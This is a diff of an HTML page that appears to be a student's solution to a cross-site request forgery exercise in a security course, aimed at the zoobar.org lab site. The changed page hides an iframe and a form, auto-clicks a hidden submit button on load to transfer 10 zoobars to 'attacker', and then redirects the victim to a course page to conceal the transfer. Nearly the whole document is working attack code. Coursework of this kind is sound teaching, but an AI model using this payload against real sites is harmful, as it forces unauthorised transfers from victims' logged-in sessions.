@@ -2,24 +2,24 @@
 <head>
 </head>
 <body>
-	<iframe id="frame" name="frame">
-		<html>
-		<head>
-		</head>
-		<body>
-			<form id="attack" method="POST" target="frame" action="http://zoobar.org/transfer.php">
-				<input name="zoobars" type="text" value="10">
-				<input name="recipient" type="text" value="attacker">
-				<input type="submit" name="submission" value="Send">
-			</form>
-			<script>document.forms[0].submit();</script>
-		</body>
-		</html>
-	</iframe>
+	<iframe id="frame" name="frame" style="visibility: hidden"></iframe>
+	<form id="attack" method="POST" target="frame" action="http://zoobar.org/transfer.php">
+		<input name="zoobars" type="hidden" value="10">
+		<input name="recipient" type="hidden" value="attacker">
+		<input id="send" type="submit" name="submission" value="Send" style="visibility: hidden">
+	</form>
 	<script>
-		var frame = document.getElementById('frame');
+		var frame = document.getElementById('frame');			
+		window.onload = function() {
+			document.getElementById('send').click();
+		}
+
+		counter = 0;
 		frame.onload = function() {
-			alert("Frame loaded!")
+			counter++;
+			if(counter >= 2) {
+				document.location='http://pages.cs.wisc.edu/~rist/642-spring-2014/';
+			}
 		};
 	</script>
 </body>
